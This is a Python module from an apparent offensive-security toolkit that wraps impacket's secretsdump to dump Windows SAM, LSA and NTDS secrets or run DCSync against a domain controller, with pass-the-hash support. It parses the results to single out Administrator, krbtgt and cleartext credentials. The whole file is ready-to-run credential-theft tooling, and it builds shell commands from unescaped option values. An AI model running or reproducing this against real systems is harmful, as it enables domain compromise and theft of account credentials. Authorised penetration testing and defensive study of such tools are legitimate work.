"""
Secrets Dump Module
Extract credentials from SAM/LSA/NTDS via DCSync
"""

from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class SecretsDump(ModuleBase):
    """
    Secrets dumping module using impacket secretsdump.
    Can dump SAM, LSA secrets, NTDS.dit, or perform DCSync.
    Supports both local execution and Exegol container execution.
    """

    def __init__(self):
        super().__init__()
        self.name = "secretsdump"
        self.description = "Dump credentials from SAM/LSA/NTDS via DCSync"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "credentials", "dump", "sam", "ntds", "lsa", "dcsync"]
        self.references = [
            "https://attack.mitre.org/techniques/T1003/",
            "https://book.hacktricks.xyz/windows-hardening/stealing-credentials"
        ]

        # Core options
        self.register_option("RHOSTS", "Target host IP (Domain Controller for DCSync)", required=True)
        self.register_option("DOMAIN", "Domain name", required=True)
        self.register_option("USER", "Username with admin/replication rights", required=True)
        self.register_option("PASS", "Password or NTLM hash", required=True)

        # Authentication type
        self.register_option("AUTH_TYPE", "Authentication type",
                           default="password", choices=["password", "hash"])

        # Method options
        self.register_option("METHOD", "Dump method",
                           default="dcsync", choices=["dcsync", "all", "sam", "lsa", "ntds"])
        self.register_option("JUST_DC_USER", "DCSync specific user only", default="")

        # Output
        self.register_option("OUTPUT", "Output file prefix", default="secretsdump_output")

        # Container
        self.register_option("EXEGOL_CONTAINER", "Exegol container (auto-detect if empty)", default="")

    def run(self) -> bool:
        target = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        auth_type = self.get_option("AUTH_TYPE")
        method = self.get_option("METHOD")
        just_dc_user = self.get_option("JUST_DC_USER")
        output = self.get_option("OUTPUT")

        self.print_status(f"Target: {target}")
        self.print_status(f"Domain: {domain}")
        self.print_status(f"User: {user}")
        self.print_status(f"Auth Type: {auth_type}")
        self.print_status(f"Method: {method}")
        if just_dc_user:
            self.print_status(f"Target User: {just_dc_user}")
        self.print_line()

        # Build command based on auth type
        if auth_type == "hash":
            # Pass-the-hash authentication
            auth_string = f"'{domain}/{user}@{target}'"
            hash_part = f"-hashes :{password}"
        else:
            # Password authentication
            auth_string = f"'{domain}/{user}:{password}@{target}'"
            hash_part = ""

        # Build method flags
        method_flags = ""
        if method == "dcsync":
            method_flags = "-just-dc"
            if just_dc_user:
                method_flags += f" -just-dc-user '{just_dc_user}'"
        elif method == "sam":
            method_flags = "-sam"
        elif method == "lsa":
            method_flags = "-lsa"
        elif method == "ntds":
            method_flags = "-ntds"
        # "all" has no flags - dumps everything

        # Build full command
        cmd = f"secretsdump.py {auth_string}"
        if hash_part:
            cmd += f" {hash_part}"
        if method_flags:
            cmd += f" {method_flags}"

        # Log command (hide password/hash)
        display_auth = f"'{domain}/{user}@{target}'"
        display_cmd = f"secretsdump.py {display_auth}"
        if auth_type == "hash":
            display_cmd += " -hashes :[HIDDEN]"
        if method_flags:
            display_cmd += f" {method_flags}"
        self.print_status(f"Command: {display_cmd}")
        self.print_line()

        # Try local first, then Exegol
        tool_path = find_tool("secretsdump.py")
        if tool_path:
            self.print_status("Using local impacket tools")
            ret, stdout, stderr = self.run_command(cmd, timeout=300)
        else:
            self.print_status("Using Exegol container for impacket tools")
            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=300)

        output_text = stdout + stderr

        # Parse output
        if not output_text.strip():
            self.print_error("No output received")
            return False

        # Process and display results
        creds_found = self._parse_output(output_text, output)

        if creds_found > 0:
            self.print_line()
            self.print_good(f"Found {creds_found} credential(s)")
            self.print_good(f"Results logged")
            return True
        elif ret == 0:
            self.print_warning("Command completed but no credentials parsed")
            return True
        else:
            self.print_error("Secrets dump failed")
            return False

    def _parse_output(self, output: str, prefix: str) -> int:
        """Parse secretsdump output and display credentials"""
        creds_found = 0
        in_hashes = False
        saved_hashes = []

        for line in output.split('\n'):
            stripped = line.strip()

            # Track sections
            if "Dumping Domain Credentials" in line:
                self.print_status("[*] Dumping Domain Credentials (NTDS)")
                in_hashes = True
                continue

            if "Dumping local SAM hashes" in line:
                self.print_status("[*] Dumping Local SAM Hashes")
                in_hashes = True
                continue

            if "Dumping LSA Secrets" in line:
                self.print_status("[*] Dumping LSA Secrets")
                continue

            if "Kerberos keys grabbed" in line:
                self.print_status("[*] Dumping Kerberos Keys")
                continue

            # Parse NTLM hashes (format: user:rid:lmhash:nthash:::)
            if in_hashes and ":::" in stripped:
                parts = stripped.split(":")
                if len(parts) >= 4:
                    username = parts[0]
                    nt_hash = parts[3] if len(parts) > 3 else "N/A"

                    # Highlight important accounts
                    if "Administrator" in username or "admin" in username.lower():
                        self.print_good(f"  [ADMIN] {username}:{nt_hash}")
                    elif "krbtgt" in username.lower():
                        self.print_good(f"  [KRBTGT] {username}:{nt_hash}")
                    elif "$" in username:
                        self.print_line(f"  [COMPUTER] {username}:{nt_hash}")
                    else:
                        self.print_status(f"  {username}:{nt_hash}")

                    saved_hashes.append(stripped)
                    creds_found += 1

            # Also show cleartext passwords
            if "cleartext password" in stripped.lower():
                self.print_good(f"  [CLEARTEXT] {stripped}")
                creds_found += 1

            # Show errors
            if "error" in stripped.lower() and "[-]" in stripped:
                self.print_error(f"  {stripped}")

        return creds_found

    def check(self) -> bool:
        # Check local first
        if find_tool("secretsdump.py"):
            return True
        # Fall back to Exegol
        ret, stdout, stderr = self.run_in_exegol("which secretsdump.py", timeout=10)
        return ret == 0
